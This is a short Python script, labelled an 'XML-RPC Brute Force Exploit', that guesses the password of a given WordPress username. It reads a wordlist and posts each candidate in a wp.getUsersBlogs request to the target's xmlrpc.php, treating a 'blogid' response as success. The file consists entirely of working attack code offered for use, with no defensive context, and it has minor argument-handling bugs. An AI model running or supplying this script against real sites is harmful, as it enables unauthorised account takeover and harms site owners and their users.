import time
import requests
import sys
import ssl
from array import *

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
    print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
    print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
    print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
    print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "" + bcolors.ENDC)
    print("\n")
    print(bcolors.OKBLUE + "XML-RPC Brute Force Exploit by Fabian Gieshoff" + bcolors.ENDC)
    print(bcolors.WARNING + "[!] Actually not Multi-Threaded!")
    print("\n")
    
if __name__ == '__main__':
    if len(sys.argv) < 3:
        banner(sys.argv, True)
        
        
url = sys.argv[1]     # SET TARGET
wordlist = sys.argv[2]     # SET CUSTOM WORDLIST
user = sys.argv[3]    # SET USERNAME TO BRUTE FORCE
LINE_UP = '\033[1A'
LINE_CLEAR = '\x1b[2K'
banner()
with open(wordlist+"", "r") as file:
    for password in file:
        password_to_try = password.strip()

        xml = '<?xml version="1.0" encoding="UTF-8"?><methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>'+user+'</value></param> <param><value>'+password_to_try+'</value></param></params></methodCall>'

        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url+"/xmlrpc.php", data=xml, headers=headers)
        responseText = response.text
        print(f"{bcolors.OKBLUE}[*] Trying password: {password_to_try}")
        print(LINE_UP, end=LINE_CLEAR)
        if(responseText.find("blogid"))!=-1:
            print(bcolors.OKGREEN + "[+]-----Password found-----")
            print(bcolors.OKGREEN + password_to_try)
            quit()

